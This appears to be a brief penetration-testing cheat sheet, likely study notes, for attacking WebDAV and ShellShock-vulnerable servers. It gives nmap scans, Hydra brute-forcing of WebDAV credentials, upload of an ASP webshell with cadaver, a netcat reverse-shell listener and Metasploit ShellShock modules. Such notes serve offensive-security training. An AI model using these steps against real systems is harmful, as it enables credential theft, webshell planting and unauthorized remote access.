# WebDav
NOTE: Will need credentials, webdav implements authentication (username: password) - Brute Force Requred (Hydra/Metasploit)

Is it configured to run on IIS? 
Post gaining legit credentials, upload a malicious asp payload that can be used to execute commands or gain reverse shell

## Scan to see version being ran
nmap -sV -p 80 --script=http-enum TARGET

## Brute Force for Credentials 
Hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt TARGET http-get /webdav/

Davtest -auth user:password -url http://TARGET/webdav

Cadaver http://TARGET/webdav
Add Webshell: put /usr/share/webshells/asp/webshell.asp

# ShellShock
(Scan to check if vulnerable) 

Nmap -sV IP -- script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi"

Open Burp Suite

Proxy -> make sure intercept is on 
Send request to repeater

## To gain reverse shell 

Set up Netcat: nc -nvlp 1234

Once connection is established go back to burp suite

Paste IP in burp -> Send -> Get reverse shell

## With Metasploit
search shellshock 
(Scan) auxiliary/scanner/http/apche_mod_cgi_bash_environment Variable Injection (Shellshock) Scanner -> set targeturi to .cgi page 
(Exploit) exploit/multi/http/apache_mod_cgi_bash_environment Variable Code Injection (Shellshock) -> set LHOST
